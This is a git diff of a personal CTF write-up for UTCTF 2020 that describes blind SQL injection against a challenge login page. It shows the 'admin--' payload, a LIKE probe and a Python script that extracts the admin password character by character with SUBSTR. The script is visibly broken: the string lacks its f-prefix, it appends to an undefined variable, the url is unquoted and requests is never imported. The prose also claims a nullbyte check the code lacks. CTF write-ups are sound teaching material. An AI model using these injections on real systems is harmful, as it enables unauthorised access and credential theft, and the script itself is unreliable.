@@ -9,7 +9,9 @@ I particpated in UTCTF with my team in March 2020. A very fun SQLi-based attack!
 
 We are presented with a clean and minimal login page. The challenge's description says that "the password is the flag". Well, since this is only a login page, I'd figure to try and get into admin somehow.
 
-Initial attempts to do some scoping for SQL vulnerabilities didn't do anything. Inputting a single quote ' mark wouldn't show anything useful. So, I went in kinda blind, and did a pretty standard SQL attack: ```admin--``` which, if there was vulnerable SQL queries to be had, would malform the query to only return the entries where the username == admin. 
+![login](./images/UTCTFscreenshot2.png)
+
+Initial attempts to do some scoping for SQL vulnerabilities didn't do anything. Inputting a single quote ' mark wouldn't show anything useful. So, I went in kinda blind, and did a pretty standard SQL attack: ```admin--``` If there were vulnerable SQL queries to be had, my input would malform the query to only return the entries where the username == admin. 
 And it worked! 
 
 
@@ -23,10 +25,38 @@ admin' AND password LIKE .....
 
 ```
 
-While I use the SQL 'LIKE' keyword here, another keyword called "substr" exists that I prefer. A teammate of mine actually created a script that bruteforced the alphanumerics letter by letter until we printed the password, but I decided to take a shot at creating one myself using binary search ~~because I haven't properly and correctly implemented that algorithm since 2nd year~~:
+While I use the SQL 'LIKE' keyword here, another keyword called "substr" exists that I prefer. [From SQL Server Tutorial:] (https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/)
+
+>The SUBSTRING() extracts a substring with a specified length starting from a location in an input string.
+
+
+A teammate of mine actually created a script that bruteforced the alphanumerics letter by letter until we printed the password, but I decided to take a shot at creating one myself using python ~~because its about time I actually learn practical python for myself~~:
 
 ```python
+
+flag = ""
+
+chars = 'abcdefghijklmnopqrstuvwxyz1234567890{}'
+
+# url here would've been the epic admin pwn site
+url = example.com
+
+for index in range(0, 40):
+    for char in chars: 
+        req = "admin' AND SUBSTR(password, {index}, 1) = '{char}'--" 
+        data = {"username": req, "pass": "JamVieSaysHello"} 
+        response = requests.post(url, data)
+        if response.text.find('Welcome, admin!') != -1: 
+            password += char 
+            print(password) 
+            continue 
 ```
 
-The idea here is to test out every character against the password's character at the given index. If they match, store it into our buffer array. When we reach the nullbyte character which terminates strings, then we print out the buffer, which should have correctly found the password! 
+The "req" var here is our custom SQL. The idea here is to test out every character against the password's character at the given index. If they match, store it into our buffer array. When we reach the nullbyte character which terminates strings, then we print out the buffer, which should have correctly found the password! 
+
+Note that, we could technically put anything we wanted into the password field - our input to it never gets checked, because we override whatever checking existed for it with our custom SQL. 
+
+There are admittedly faster ways to do this, for example, if you have burpsuite and sqlmap you could save the post request data into a text file and have sqlmap dump the underlying database for you, which should also return the flag. However, creating the script and testing it out was alot of fun! 
+
+Jam
 
